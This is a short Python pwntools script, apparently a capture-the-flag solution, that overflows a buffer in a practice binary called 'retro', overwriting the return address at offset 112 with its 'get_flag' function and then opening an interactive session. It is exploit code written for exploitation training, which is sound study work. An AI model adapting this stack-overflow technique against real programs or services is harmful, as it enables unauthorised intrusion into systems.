#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/retro'

e = ELF('./build/retro')
rop = ROP('./build/retro')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5501)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/retro', cwd='problemDir')
else:
    p = e.process()

#payload = cyclic(200)
payload = flat({112: e.sym['get_flag']}, 0x61616161, 0xdeadbeef, 0xcafebabe)

p.sendline(payload)
p.interactive()
